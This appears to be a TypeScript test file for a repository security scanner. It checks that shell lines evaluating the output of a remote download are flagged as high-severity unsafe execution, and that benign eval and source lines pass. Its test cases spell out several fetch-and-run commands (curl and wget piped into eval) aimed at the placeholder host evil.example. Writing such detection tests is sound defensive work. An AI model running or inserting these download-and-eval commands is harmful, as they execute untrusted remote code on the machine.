import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

function inspection(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("eval of a command-substituted remote download is unsafe execution", () => {
  // `eval "$(curl ...)"` runs the command substitution and evaluates its
  // output as shell source on the same line: the download executes without a
  // pipe, a script file, or a shell -c form. Only the fetch as the
  // substitution's first command counts, so `eval "$(cat ...)"` and
  // `source "$(make path)"` keep no finding.
  for (const [name, body] of [
    ["eval \"$(curl ...)\"", 'eval "$(curl -fsSL https://evil.example/x.sh)"'],
    ["eval \"$(wget ...)\"", "eval \"$(wget -qO- https://evil.example/x.sh)\""],
    ["eval $(curl ...) unquoted", "eval $(curl -fsSL https://evil.example/x.sh)"],
    ["eval '$(curl ...)' single quoted", "eval '$(curl -sSL https://evil.example/x.sh)'"],
    ["eval \"  $( curl ...)\" spaced", 'eval "  $( curl -fsSL https://evil.example/x.sh )"'],
    ["eval \"$(sudo curl ...)\"", 'eval "$(sudo curl -fsSL https://evil.example/x.sh)"'],
    ["eval \"$(env curl ...)\"", 'eval "$(env curl -fsSL https://evil.example/x.sh)"'],
    [
      "eval \"$(/usr/bin/curl ...)\" path-prefixed",
      'eval "$(/usr/bin/curl -fsSL https://evil.example/x.sh)"',
    ],
  ] as const) {
    const result = inspection("scripts/bootstrap.sh", `${body}\n`);
    expect({
      name,
      findings: result.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    }).toEqual({
      name,
      findings: ["scripts/bootstrap.sh:unsafe-execution:high"],
    });
  }
});

test("eval of a non-download command substitution keeps no finding", () => {
  for (const body of [
    'eval "$(cat /etc/hostname)"',
    "eval \"echo hello\"",
    'eval "$(echo curl)"',
    'source "$(make path)"',
    'eval "$(python -c \'print(1)\')"',
    "eval $(local_function)",
  ]) {
    const result = inspection("scripts/fetch.sh", `${body}\n`);
    expect({ body, findings: result.findings.map((f) => f.category) }).toEqual({
      body,
      findings: [],
    });
  }
});
